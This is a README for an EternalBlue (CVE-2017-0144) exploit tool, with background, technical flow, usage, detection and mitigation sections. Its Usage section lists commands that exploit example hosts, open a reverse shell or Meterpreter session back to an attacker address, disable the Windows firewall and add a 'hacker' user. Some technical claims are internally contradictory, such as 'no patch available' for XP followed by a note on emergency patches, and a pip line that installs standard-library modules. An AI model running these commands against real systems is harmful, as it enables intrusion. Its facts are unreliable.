EternalBlue (CVE-2017-0144)
===========================

**Original Discovery:** NSA (leaked by Shadow Brokers)  
**Adapted by:**         Hyperion Gray Security Research Team  
**Date:**               2017-04-14 (public disclosure) / 2024-11-16 (adaptation)  
**CVE:**                [CVE-2017-0144](https://nvd.nist.gov/vuln/detail/CVE-2017-0144)  
**CVSS Score:**         8.1 (High)  
**Advisory:**           https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010  
**Tested on:**          Windows 7, Windows Server 2008/2012, Windows XP (unpatched)

Overview
--------

CVE-2017-0144, known as "EternalBlue", is a critical vulnerability in Microsoft's Server Message Block 1.0 (SMBv1) protocol. Originally developed as an exploit by the NSA, it was leaked by the Shadow Brokers hacking group in April 2017. The vulnerability allows remote code execution on vulnerable Windows systems without authentication.

EternalBlue gained worldwide notoriety when it was weaponized in the WannaCry ransomware attack in May 2017, which infected hundreds of thousands of computers across the globe. The exploit targets a buffer overflow in the SMBv1 protocol implementation, allowing attackers to execute arbitrary code with SYSTEM privileges.

The vulnerability exists in the way SMBv1 handles specially crafted packets during the authentication process. By sending malformed SMB packets, an attacker can cause a buffer overflow that overwrites memory and allows code execution.

Affected Versions
----------------

**Vulnerable Systems:**
- Windows XP (all versions) - **No patch available**
- Windows Vista (all versions)
- Windows 7 (all versions)
- Windows 8.1 (all versions)
- Windows 10 (versions prior to 1703)
- Windows Server 2003 (all versions) - **No patch available**
- Windows Server 2008 (all versions)
- Windows Server 2008 R2 (all versions)
- Windows Server 2012 (all versions)
- Windows Server 2012 R2 (all versions)
- Windows Server 2016 (prior to specific updates)

**Patched Versions:**
- All systems with MS17-010 security update installed
- Windows 10 version 1703 and later (SMBv1 disabled by default)
- Systems with SMBv1 completely disabled

**Note:** Windows XP and Server 2003 received emergency patches despite being end-of-life due to the severity of WannaCry.

Technical Details
----------------

EternalBlue exploits a type confusion vulnerability in the SMBv1 protocol's handling of transaction requests. The vulnerability occurs in the `srv.sys` driver when processing SMB_COM_TRANSACTION2 requests.

**Vulnerability Mechanism:**
1. **Initial Connection:** Attacker establishes SMB connection to target
2. **Authentication Bypass:** Sends specially crafted SMB packets during authentication
3. **Buffer Overflow:** Triggers overflow in kernel memory pool allocation
4. **Memory Corruption:** Overwrites adjacent memory structures
5. **Code Execution:** Redirects execution flow to attacker-controlled shellcode

**Technical Flow:**
```
1. SMB_COM_NEGOTIATE → Establish SMB session
2. SMB_COM_SESSION_SETUP_ANDX → Begin authentication
3. SMB_COM_TREE_CONNECT_ANDX → Connect to IPC$ share
4. SMB_COM_TRANSACTION2 → Trigger vulnerability with malformed packet
5. Shellcode execution → Gain SYSTEM privileges
```

**Memory Layout Exploitation:**
- Targets kernel pool memory allocation
- Exploits predictable memory layout in Windows kernel
- Uses heap spraying techniques to control memory layout
- Bypasses ASLR through information disclosure
- Achieves reliable code execution across different Windows versions

**Exploit Characteristics:**
- **Wormable:** Can spread automatically between systems
- **Unauthenticated:** No credentials required
- **Remote:** Exploitable over network (TCP port 445)
- **Kernel-level:** Achieves highest privilege level (SYSTEM)
- **Cross-version:** Works across multiple Windows versions

Installation
-----------

Install required dependencies:

```bash
pip install impacket pysmb struct socket
```

Additional requirements for full exploitation:
- Python 3.6+ recommended
- Network access to target SMB service (port 445)
- Understanding of Windows architecture for payload development

Usage
-----

### Vulnerability Scanning

Test systems for EternalBlue vulnerability:

```bash
# Basic vulnerability scan
python exploit.py -t 192.168.1.100

# Scan multiple targets
python exploit.py -t 192.168.1.0/24

# Scan with verbose output
python exploit.py -t 192.168.1.100 -v

# Scan from file
python exploit.py -f targets.txt
```

### Advanced Scanning Options

```bash
# Custom timeout and threads
python exploit.py -t 192.168.1.0/24 --timeout 5 --threads 50

# Check specific SMB versions
python exploit.py -t 192.168.1.100 --check-smb-version

# Test with different SMB dialects
python exploit.py -t 192.168.1.100 --smb-dialect NT_LM_0.12

# Quiet mode (only show vulnerable hosts)
python exploit.py -t 192.168.1.0/24 -q
```

### Exploitation Mode

**WARNING:** Only use against systems you own or have explicit permission to test.

```bash
# Basic exploitation (proof of concept)
python exploit.py -t 192.168.1.100 --exploit --payload calc

# Custom shellcode payload
python exploit.py -t 192.168.1.100 --exploit --payload-file shellcode.bin

# Reverse shell payload
python exploit.py -t 192.168.1.100 --exploit --reverse-shell 192.168.1.50:4444

# Meterpreter payload
python exploit.py -t 192.168.1.100 --exploit --meterpreter 192.168.1.50:4444
```

### Payload Options

```bash
# Built-in payloads
python exploit.py -t 192.168.1.100 --exploit --payload calc          # Calculator
python exploit.py -t 192.168.1.100 --exploit --payload cmd           # Command prompt
python exploit.py -t 192.168.1.100 --exploit --payload disable-fw    # Disable Windows Firewall

# Custom payloads
python exploit.py -t 192.168.1.100 --exploit --custom-payload "net user hacker password123 /add"
```

Detection
---------

**Network-based Detection:**
- Monitor for unusual SMB traffic patterns on port 445
- Look for SMB_COM_TRANSACTION2 requests with suspicious parameters
- Detect multiple failed SMB authentication attempts
- Monitor for connections to IPC$ share from external sources
- Watch for SMB traffic with unusual packet sizes or structures

**Host-based Detection:**
- Monitor for unexpected process creation (especially from system processes)
- Watch for unusual network connections from system processes
- Check for modifications to system files or registry
- Monitor for privilege escalation events
- Look for signs of lateral movement

**Indicators of Compromise (IoCs):**
- Unusual SMB connections in network logs
- Unexpected system-level process spawning
- Network connections from system processes
- Registry modifications related to SMB configuration
- Event ID 4624 (successful logon) with unusual characteristics

**Security Tools:**
- Windows Defender (signatures for EternalBlue)
- Snort/Suricata rules for SMB anomalies
- YARA rules for EternalBlue shellcode
- Nessus plugin 97833 (MS17-010 detection)
- Nmap script smb-vuln-ms17-010

Mitigation
----------

### Immediate Actions

1. **Apply Microsoft Security Update MS17-010:**
   ```powershell
   # Check if patch is installed
   Get-HotFix -Id KB4013389
   
   # Download and install from Microsoft Update Catalog
   # Or use Windows Update
   ```

2. **Disable SMBv1 Protocol:**
   ```powershell
   # Disable SMBv1 (Windows 8.1/Server 2012 R2 and later)
   Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol
   
   # For older systems, use registry
   Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" SMB1 -Type DWORD -Value 0 -Force
   
   # Restart required
   Restart-Computer
   ```

3. **Block SMB Ports at Firewall:**
   ```powershell
   # Block inbound SMB traffic
   New-NetFirewallRule -DisplayName "Block SMB Inbound" -Direction Inbound -Protocol TCP -LocalPort 445 -Action Block
   New-NetFirewallRule -DisplayName "Block SMB Inbound" -Direction Inbound -Protocol TCP -LocalPort 139 -Action Block
   
   # For older systems
   netsh advfirewall firewall add rule name="Block SMB" dir=in action=block protocol=TCP localport=445
   ```

4. **Network Segmentation:**
   - Isolate critical systems from internet access
   - Implement network access controls
   - Use VPNs for remote access instead of direct SMB exposure
   - Deploy intrusion detection/prevention systems

### Long-term Security Measures

**Patch Management:**
- Implement automated patch management system
- Prioritize security updates for critical vulnerabilities
- Test patches in isolated environment before deployment
- Maintain inventory of all systems and their patch status

**Network Security:**
- Implement network segmentation and micro-segmentation
- Deploy next-generation firewalls with deep packet inspection
- Use network access control (NAC) solutions
- Monitor network traffic for anomalies

**Endpoint Security:**
- Deploy endpoint detection and response (EDR) solutions
- Use application whitelisting where possible
- Implement behavioral analysis and anomaly detection
- Regular security awareness training for users

**Legacy System Management:**
- Identify and inventory all legacy systems
- Develop migration plans for unsupported systems
- Implement additional security controls for legacy systems
- Consider air-gapping critical legacy systems

Real-World Impact
----------------

EternalBlue has been one of the most devastating vulnerabilities in cybersecurity history:

**WannaCry Ransomware (May 2017):**
- Infected over 300,000 computers in 150+ countries
- Disrupted UK's National Health Service (NHS)
- Affected hospitals, railways, telecommunications, and government agencies
- Estimated damages in billions of dollars

**NotPetya Attack (June 2017):**
- Initially targeted Ukraine but spread globally
- Caused over $10 billion in damages worldwide
- Permanently destroyed data even after ransom payment
- Attributed to Russian state-sponsored actors

**Other Notable Attacks:**
- BadRabbit ransomware campaigns
- Various cryptocurrency mining operations
- Nation-state espionage campaigns
- Botnet recruitment and maintenance

**Ongoing Threat:**
- Continues to be exploited years after patch availability
- Used in targeted attacks against unpatched systems
- Component of many advanced persistent threat (APT) toolkits
- Regularly seen in penetration testing and red team exercises

**Global Response:**
- Emergency patches released for end-of-life systems
- International cooperation on threat intelligence
- Increased focus on vulnerability management
- Enhanced cybersecurity awareness and training

References
----------

- [Microsoft Security Bulletin MS17-010](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)
- [NVD Entry CVE-2017-0144](https://nvd.nist.gov/vuln/detail/CVE-2017-0144)
- [US-CERT Alert TA17-132A](https://www.cisa.gov/news-events/cybersecurity-advisories/aa17-132a)
- [Shadow Brokers Leak Analysis](https://www.symantec.com/connect/blogs/shadow-brokers-leak-nsa-hacking-tools)
- [WannaCry Technical Analysis](https://www.fireeye.com/blog/threat-research/2017/05/wannacry-malware-profile.html)
- [EternalBlue Technical Deep Dive](https://research.checkpoint.com/2017/eternalblue-everything-know/)
- [Microsoft SMBv1 Deprecation](https://blogs.technet.microsoft.com/filecab/2016/09/16/stop-using-smb1/)

Legal Notice
-----------

This tool is provided for educational and authorized security testing purposes only.
Unauthorized access to computer systems is illegal and may violate local, state, federal,
or international laws. Always obtain explicit written permission before testing any system
you do not own.

The EternalBlue exploit has been used in numerous criminal attacks causing billions of
dollars in damages. Use of this tool against systems without permission may result in
severe legal consequences. Users are solely responsible for compliance with all applicable laws.

This tool should only be used by security professionals for legitimate security testing,
research, and educational purposes in controlled environments.